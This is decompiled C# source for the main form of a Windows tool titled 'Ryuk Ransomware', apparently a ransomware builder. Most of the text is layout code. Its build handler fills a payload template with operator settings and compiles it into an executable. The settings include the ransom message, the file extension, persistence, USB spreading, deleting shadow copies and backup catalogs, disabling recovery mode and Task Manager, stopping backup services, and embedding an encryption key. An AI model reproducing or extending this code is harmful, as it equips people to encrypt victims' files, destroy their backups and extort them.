		((Control)LeftBottomPanel_2).TabIndex = 11;
		((Control)LeftBottomPanel_2).MouseDown += new MouseEventHandler(LeftBottomPanel_2_MouseDown);
		((Control)LeftBottomPanel_2).MouseMove += new MouseEventHandler(LeftBottomPanel_2_MouseMove);
		((Control)LeftBottomPanel_2).MouseUp += new MouseEventHandler(LeftBottomPanel_2_MouseUp);
		((Control)RightTopPanel_1).Anchor = (AnchorStyles)9;
		((Control)RightTopPanel_1).BackColor = Color.Black;
		((Control)RightTopPanel_1).Cursor = Cursors.SizeNESW;
		((Control)RightTopPanel_1).Location = new Point(896, 2);
		((Control)RightTopPanel_1).Name = "RightTopPanel_1";
		((Control)RightTopPanel_1).Size = new Size(2, 20);
		((Control)RightTopPanel_1).TabIndex = 12;
		((Control)RightTopPanel_1).MouseDown += new MouseEventHandler(RightTopPanel_1_MouseDown);
		((Control)RightTopPanel_1).MouseMove += new MouseEventHandler(RightTopPanel_1_MouseMove);
		((Control)RightTopPanel_1).MouseUp += new MouseEventHandler(RightTopPanel_1_MouseUp);
		((Control)RightTopPanel_2).Anchor = (AnchorStyles)9;
		((Control)RightTopPanel_2).BackColor = Color.Black;
		((Control)RightTopPanel_2).Cursor = Cursors.SizeNESW;
		((Control)RightTopPanel_2).Location = new Point(878, 0);
		((Control)RightTopPanel_2).Name = "RightTopPanel_2";
		((Control)RightTopPanel_2).Size = new Size(20, 2);
		((Control)RightTopPanel_2).TabIndex = 13;
		((Control)RightTopPanel_2).MouseDown += new MouseEventHandler(RightTopPanel_2_MouseDown);
		((Control)RightTopPanel_2).MouseMove += new MouseEventHandler(RightTopPanel_2_MouseMove);
		((Control)RightTopPanel_2).MouseUp += new MouseEventHandler(RightTopPanel_2_MouseUp);
		((Control)textBox1).Anchor = (AnchorStyles)15;
		((Control)textBox1).BackColor = Color.FromArgb(30, 30, 30);
		((TextBoxBase)textBox1).BorderStyle = (BorderStyle)0;
		((Control)textBox1).Font = new Font("Microsoft Sans Serif", 12f, (FontStyle)1, (GraphicsUnit)3, (byte)0);
		((Control)textBox1).ForeColor = SystemColors.Window;
		((Control)textBox1).Location = new Point(12, 80);
		((TextBoxBase)textBox1).Multiline = true;
		((Control)textBox1).Name = "textBox1";
		textBox1.ScrollBars = (ScrollBars)2;
		((Control)textBox1).Size = new Size(833, 304);
		((Control)textBox1).TabIndex = 18;
		((Control)textBox1).Text = componentResourceManager.GetString("textBox1.Text");
		((TextBoxBase)textBox1).MouseClick += new MouseEventHandler(textBox1_MouseClick);
		((Control)textBox1).TextChanged += textBox1_TextChanged;
		((FileDialog)saveFileDialog1).FileOk += saveFileDialog1_FileOk;
		((FileDialog)openFileDialog1).FileName = "openFileDialog1";
		((ContainerControl)this).AutoScaleDimensions = new SizeF(6f, 13f);
		((ContainerControl)this).AutoScaleMode = (AutoScaleMode)1;
		((ScrollableControl)this).AutoScroll = true;
		((Control)this).BackColor = Color.FromArgb(30, 30, 30);
		((Form)this).ClientSize = new Size(847, 544);
		((Control)this).Controls.Add((Control)(object)textBox1);
		((Control)this).Controls.Add((Control)(object)RightTopPanel_2);
		((Control)this).Controls.Add((Control)(object)RightTopPanel_1);
		((Control)this).Controls.Add((Control)(object)LeftBottomPanel_2);
		((Control)this).Controls.Add((Control)(object)RightBottomPanel_2);
		((Control)this).Controls.Add((Control)(object)RightBottomPanel_1);
		((Control)this).Controls.Add((Control)(object)RightPanel);
		((Control)this).Controls.Add((Control)(object)TopPanel);
		((Control)this).Controls.Add((Control)(object)panel2);
		((Form)this).FormBorderStyle = (FormBorderStyle)0;
		((Control)this).MinimumSize = new Size(847, 544);
		((Control)this).Name = "BlackForm";
		((Form)this).StartPosition = (FormStartPosition)1;
		((Control)this).Text = "Ryuk Ransomware";
		((Form)this).Load += BlackForm_Load;
		((Control)TopPanel).ResumeLayout(false);
		((Control)TopPanel).PerformLayout();
		((Control)panel2).ResumeLayout(false);
		((Control)panel2).PerformLayout();
		((ISupportInitialize)pictureBox1).EndInit();
		((Control)this).ResumeLayout(false);
		((Control)this).PerformLayout();
	}

	private void button1_Click_1(object sender, EventArgs e)
	{
		//IL_0005: Unknown result type (might be due to invalid IL or missing references)
		((Form)new extensions()).ShowDialog();
	}

	private void button2_Click(object sender, EventArgs e)
	{
		//IL_0005: Unknown result type (might be due to invalid IL or missing references)
		((Form)new advancedSettingForm()).ShowDialog();
	}

	private void button3_Click(object sender, EventArgs e)
	{
		//IL_0005: Unknown result type (might be due to invalid IL or missing references)
		((Form)new Form2()).ShowDialog();
	}

	private void button4_Click(object sender, EventArgs e)
	{
		//IL_0025: Unknown result type (might be due to invalid IL or missing references)
		//IL_0045: Unknown result type (might be due to invalid IL or missing references)
		//IL_0144: Unknown result type (might be due to invalid IL or missing references)
		//IL_020e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0486: Unknown result type (might be due to invalid IL or missing references)
		//IL_055c: Unknown result type (might be due to invalid IL or missing references)
		//IL_05e1: Unknown result type (might be due to invalid IL or missing references)
		//IL_05e8: Expected O, but got Unknown
		//IL_05f6: Unknown result type (might be due to invalid IL or missing references)
		//IL_05fc: Invalid comparison between Unknown and I4
		if (((Control)textBox1).Text.Trim().Length < 1)
		{
			MessageBox.Show("Please type your message!", "Read_it.txt", (MessageBoxButtons)0, (MessageBoxIcon)16);
			return;
		}
		if (string.IsNullOrWhiteSpace("aa"))
		{
			MessageBox.Show("All fields are required", "Error", (MessageBoxButtons)0, (MessageBoxIcon)16);
			return;
		}
		StringBuilder stringBuilder = new StringBuilder();
		for (int i = 0; i < ((TextBoxBase)textBox1).Lines.Length; i++)
		{
			string text = ((TextBoxBase)textBox1).Lines[i].Replace("\"", "'");
			stringBuilder.Append("\"" + text + "\",\n");
		}
		string text2 = Resources.Source.Replace("#messages", stringBuilder.ToString());
		string text3;
		if (checkBox1.Checked)
		{
			text3 = text2.Replace("#encryptedFileExtension", "");
		}
		else
		{
			string text4 = ((Control)textBox2).Text;
			if (text4.Contains("."))
			{
				text4 = text4.Replace(".", "");
			}
			text3 = text2.Replace("#encryptedFileExtension", text4);
		}
		string text5;
		if (checkBox2.Checked)
		{
			if (((Control)textBox4).Text.Trim().Length < 1)
			{
				MessageBox.Show("Proccess name field is empty");
				return;
			}
			text5 = ((!((Control)textBox4).Text.EndsWith(".exe")) ? text3.Replace("#copyRoaming", "true").Replace("#exeName", ((Control)textBox4).Text + ".exe") : text3.Replace("#copyRoaming", "true").Replace("#exeName", ((Control)textBox4).Text));
		}
		else
		{
			text5 = text3.Replace("#copyRoaming", "false").Replace("#exeName", ((Control)textBox4).Text);
		}
		string text6;
		if (usbSpreadCheckBox.Checked)
		{
			if (((Control)spreadNameText).Text.Trim().Length < 1)
			{
				MessageBox.Show("Usb spread name field is empty");
				return;
			}
			text6 = ((!((Control)spreadNameText).Text.EndsWith(".exe")) ? text5.Replace("#checkSpread", "true").Replace("#spreadName", ((Control)spreadNameText).Text + ".exe") : text5.Replace("#checkSpread", "true").Replace("#spreadName", ((Control)spreadNameText).Text));
		}
		else
		{
			text6 = text5.Replace("#checkSpread", "false").Replace("#spreadName", ((Control)spreadNameText).Text);
		}
		string text7 = ((!startupcheckBox3.Checked) ? text6.Replace("#startupFolder", "true") : text6.Replace("#startupFolder", "true"));
		string text8 = ((!sleepCheckBox.Checked) ? text7.Replace("#checkSleep", "false").Replace("#sleepTextbox", ((Control)SleepTextBox).Text) : text7.Replace("#checkSleep", "true").Replace("#sleepTextbox", ((Control)SleepTextBox).Text));
		string text9 = ((!Settings.Default.checkAdminPrivilage) ? text8.Replace("#adminPrivilage", "false") : text8.Replace("#adminPrivilage", "true"));
		string text10 = ((!Settings.Default.deleteBackupCatalog) ? text9.Replace("#checkdeleteBackupCatalog", "false") : text9.Replace("#checkdeleteBackupCatalog", "true"));
		string text11 = ((!Settings.Default.deleteShadowCopies) ? text10.Replace("#checkdeleteShadowCopies", "false") : text10.Replace("#checkdeleteShadowCopies", "true"));
		string text12 = ((!Settings.Default.disableRecoveryMode) ? text11.Replace("#checkdisableRecoveryMode", "false") : text11.Replace("#checkdisableRecoveryMode", "true"));
		string text13 = ((!Settings.Default.disableTaskManager) ? text12.Replace("#checkdisableTaskManager", "false") : text12.Replace("#checkdisableTaskManager", "true"));
		string text14 = ((!Settings.Default.stopBackupServices) ? text13.Replace("#checkStopBackupServices", "false") : text13.Replace("#checkStopBackupServices", "true"));
		if (((Control)droppedMessageTextbox).Text.Trim().Length < 1)
		{
			MessageBox.Show("Dropped message name field is empty");
			return;
		}
		string text15 = text14.Replace("#droppedMessageTextbox", ((Control)droppedMessageTextbox).Text);
		string publicKey = Settings.Default.publicKey;
		if (Settings.Default.encryptOption)
		{
			if (!(publicKey != ""))
			{
				MessageBox.Show("Decrypter name field is empty. Go to \"Decrypter & Options\" and create or select decrypter", "Advanced Option");
				return;
			}
			using StringReader stringReader = new StringReader(publicKey);
			StringBuilder stringBuilder2 = new StringBuilder();
			string text16;
			while ((text16 = stringReader.ReadLine()) != null)
			{
				string text17 = text16.Replace("\"", "\\\"");
				stringBuilder2.AppendLine("pubclicKey.AppendLine(\"" + text17 + "\");");
			}
			text15 = text15.Replace("#encryptOption", "true");
			text15 = text15.Replace("#publicKey", stringBuilder2.ToString());
		}
		else
		{
			text15 = text15.Replace("#encryptOption", "false").Replace("#publicKey", "");
		}
		if (Settings.Default.base64Image != "")
		{
			text15 = text15.Replace("#base64Image", Settings.Default.base64Image);
		}
		if (Settings.Default.extensions != "")
		{
			text15 = text15.Replace("#extensions", Settings.Default.extensions);
		}
		SaveFileDialog val = new SaveFileDialog();
		try
		{
			((FileDialog)val).Filter = "Executable (*.exe)|*.exe";
			if ((int)((CommonDialog)val).ShowDialog() == 1)
			{
				new Compiler(text15, ((FileDialog)val).FileName, iconLocation);
			}
		}
		finally
		{
			((IDisposable)val)?.Dispose();
		}
	}
}
